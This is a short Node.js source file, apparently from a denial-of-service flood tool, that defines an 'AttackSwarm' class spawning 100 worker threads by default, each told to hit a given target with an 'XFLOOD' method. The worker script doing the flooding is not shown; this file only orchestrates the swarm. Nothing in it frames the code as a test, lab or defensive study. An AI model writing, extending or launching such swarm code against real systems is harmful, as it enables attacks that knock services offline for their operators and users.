// api/worker.js
const { Worker, isMainThread, workerData } = require('worker_threads');

class AttackSwarm {
    static launchSwarm(target, threads = 100) {
        for(let i = 0; i < threads; i++) {
            new Worker('./api/attackWorker.js', {
                workerData: { target, method: 'XFLOOD', threadId: i }
            });
        }
    }
}